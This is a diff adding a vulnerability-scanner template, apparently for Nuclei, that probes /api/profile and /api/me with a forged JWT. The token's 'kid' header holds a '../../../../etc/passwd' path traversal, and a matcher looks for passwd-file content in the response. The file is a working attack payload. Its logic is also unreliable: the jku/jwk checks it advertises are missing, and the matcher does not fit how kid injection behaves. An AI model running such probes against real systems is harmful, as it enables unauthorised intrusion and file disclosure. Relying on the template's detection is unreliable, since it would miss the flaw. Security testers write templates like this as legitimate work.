@@ -1,0 +1,24 @@
+id: m7-jwt-header-injection
+info:
+  name: M7 - JWT Header Injection (kid/jku/jwk)
+  author: Sharlix
+  severity: critical
+  description: JWT header parameter injection via kid path traversal or jku/jwk injection
+  tags: jwt,header,injection,kid,m7hunter
+  reference:
+    - https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/me"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyX2lkIjoxfQ.test"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:x?:\d+:\d+:"
+        part: body
